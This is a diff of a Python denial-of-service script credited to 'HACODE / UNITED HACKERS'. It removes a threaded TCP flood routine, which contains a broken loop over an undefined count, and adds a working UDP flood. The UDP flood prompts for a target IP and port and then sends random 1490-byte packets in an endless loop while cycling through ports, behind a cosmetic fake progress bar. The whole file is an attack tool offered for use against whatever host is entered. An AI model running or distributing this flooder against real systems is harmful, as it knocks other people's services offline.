@@ -29,49 +29,81 @@ print("Ddos©Attaka©Tpc")
 time.sleep(2.5)
 os.system("clear")
 print()
-from concurrent.futures import thread
+# ./Author : HACODE
+import os
 import random
-import socket
-from struct import pack
-import threading
-import os 
+import sys
 import time
-print("""
- ▓█████▄  ▒█████    ██████ ▓█████ ██▀███  
- ▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▓█   ▀▓██ ▒ ██▒
- ░██   █▌▒██░  ██▒░ ▓██▄   ▒███  ▓██ ░▄█ ▒
-▒░▓█▄   ▌▒██   ██░  ▒   ██▒▒▓█  ▄▒██▀▀█▄  
-░░▒████▓ ░ ████▓▒░▒██████▒▒░▒████░██▓ ▒██▒
-░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▓ ░▒▓░
-  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░   ░ ░    ░▒ ░ ▒░
-  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░     ░   ░ 
-    ░        ░ ░        ░     ░     ░     
-Made by Mr-Cuda
-""")
-a = str(input(" IP =>"))
-b = int(input(" Port =>"))
-c = int(input(" Thread =>"))
-#target = '10.0.0.138'
-target = (a)
-port = (b)
-thread = (c)
-def start():
-    s = random._urandom(10)
-    x = int(0)
-    while True:
-        try:
-            d =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            d.connect((target,port))
-            d.send(s)
-            for i in range(pack):
-                d.send(s)
-            x += 1
-            print(f"ddosing {target} on port {port} allready sent : {x}")
-        except:
-            d.close()
-            print("Done...")
-            quit()
-            time.sleep(500)
-for x in range(thread):
-    thread = threading.Thread(target=start)
-    thread.start()
+import socket
+from datetime import datetime
+
+
+#Colour
+yellow='\033[93m'
+gren='\033[92m'
+cyan='\033[96m'
+pink='\033[95m'
+red='\033[91m'
+b='\033[1m'
+
+#
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+
+month = now.month
+year = now.year
+
+
+def logo():
+	os.system('clear')
+	print(pink+red+b+'''
+	           █▀▄ █▀▄ █▀█ █▀  
+	           █▄▀ █▄▀ █▄█ ▄█  
+	
+	  █▄▄ █▄█   █░█ ▄▀█ █▀▀ █▀█ █▀▄ █▀▀
+	  █▄█ ░█░   █▀█ █▀█ █▄▄ █▄█ █▄▀ ██▄   '''+b+red+pink)
+	
+
+
+
+
+#
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+#
+def first(self):
+	logo()
+	print("")
+	print(pink+b+"Author     : HACODE"+b+pink)
+	print("Team	    : UNITED HACKERS")
+	print("YouTube    : HACODE")
+	print("")
+	
+	#
+	ip = input(gren+b+"Target IP  : "+b+gren)
+	port = int(input("Enter Port  : "))
+	print("")
+	print(cyan+b+"[+]--                            [+] 0%"+b+cyan)
+	time.sleep(2)
+	print("[+]--xxxxxxx>                    [+] 25%")
+	time.sleep(2)
+	print("[+]--xxxxxxxxxxxx>               [+] 50%")
+	time.sleep(3)
+	print("[+]--xxxxxxxxxxxxxxxxx>          [+] 75%")
+	time.sleep(2)
+	print(cyan+b+"[+]--xxxxxxxxxxxxxxxxxxxxxx>     [+] 100%"+b+cyan)
+	time.sleep(2)
+	os.system('clear')
+	sent = 0
+	
+	while True:
+		sock.sendto(bytes, (ip, port))
+		sent = sent + 1
+		port = port + 1
+		
+		print(f"HACODE :- sent %s packet to %s througj port:%s"%(sent,ip,port))
+
+first('f')
